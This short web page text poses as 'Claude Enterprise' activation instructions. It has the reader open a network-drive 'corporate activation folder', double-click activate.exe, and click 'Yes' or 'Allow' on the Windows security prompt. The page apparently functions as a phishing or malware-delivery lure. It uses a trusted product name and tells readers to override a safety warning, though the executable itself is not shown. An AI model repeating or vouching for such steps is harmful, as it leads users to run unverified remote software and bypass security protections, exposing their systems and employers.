To activate full Claude Enterprise features for your organization, we need to sync your workstation with the corporate license server.

  1. Step 1: Launch Activation Agent

    Click the button below to open the corporate activation folder in Explorer.

  2. Step 2: Activate License

    Double-click the file activate.exe

  3. Step 3: Complete Activation

    Wait for the process to finish, then restart your browser.

Network Drive Access

Windows may display a security prompt asking for permission to connect to the network drive. This is required for corporate license verification. Click "Yes" or "Allow" to proceed with activation.
